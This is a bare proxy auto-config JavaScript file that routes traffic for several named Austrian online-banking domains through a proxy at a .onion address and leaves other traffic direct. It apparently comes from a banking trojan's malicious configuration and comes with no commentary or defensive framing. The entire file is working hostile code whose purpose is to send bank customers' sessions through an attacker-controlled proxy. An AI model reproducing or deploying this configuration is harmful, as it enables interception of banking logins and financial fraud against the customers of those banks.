function FindProxyForURL(url, host) {
    var proxy = "PROXY 6aaoqcl2leiptpvn.onion:5588;";
    var hosts = new Array('*bankaustria.at', '*.bawagpsk.com', '*raiffeisen.at',
        '*.bawag.com', 'www.banking.co.at', '*oberbank.at',
        'www.oberbank-banking.at', '*.easybank.at');
    for (var i = 0; i < hosts.length; i++) {
        if (shExpMatch(host, hosts[i])) {
            return proxy
        }
    }
    return "DIRECT"
}
